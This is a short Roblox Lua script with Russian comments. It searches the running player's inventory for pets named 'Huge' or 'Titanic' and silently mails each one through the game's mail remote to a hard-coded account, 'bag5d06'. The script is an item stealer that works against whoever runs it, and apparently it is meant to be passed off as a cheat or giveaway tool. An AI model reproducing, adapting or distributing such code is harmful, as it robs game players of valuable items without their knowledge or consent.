local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local target = "bag5d06"

repeat task.wait() until player and player.Character

local storage = player:FindFirstChild("PetStorage") or player:FindFirstChild("Pets") or player:FindFirstChild("InventoryFolder")
if not storage then 
    print("1") -- Не нашло папку с петами
    return 
end

local mailRemote = ReplicatedStorage:FindFirstChild("Remotes") and (ReplicatedStorage.Remotes:FindFirstChild("Mail") or ReplicatedStorage.Remotes:FindFirstChild("SendPet") or ReplicatedStorage.Remotes:FindFirstChild("MailSystem"))
if not mailRemote then
    mailRemote = ReplicatedStorage:FindFirstChild("Mail") or ReplicatedStorage:FindFirstChild("SendPet") or ReplicatedStorage:FindFirstChild("PetMail")
end
if not mailRemote then 
    print("2") -- Не нашло систему отправки
    return 
end

local function sendPet(pet)
    pcall(function()
        pcall(function()
            mailRemote:InvokeServer("SendPet", {["pet"] = pet, ["player"] = target})
        end)
        pcall(function()
            mailRemote:InvokeServer({["pet"] = pet, ["player"] = target})
        end)
    end)
end

local foundAny = false
for _, folderName in pairs({"Equipped", "Inventory", "Pets"}) do
    local folder = storage:FindFirstChild(folderName)
    if folder then
        for _, pet in pairs(folder:GetChildren()) do
            if pet:IsA("Folder") then
                local name = pet.Name
                if name:find("Huge") or name:find("Titanic") or name:find("huge") or name:find("titanic") then
                    foundAny = true
                    task.wait(0.3)
                    sendPet(pet)
                end
            end
        end
    end
end

if not foundAny then
    print("3") -- Не нашло ни одного Huge/Titanic
end
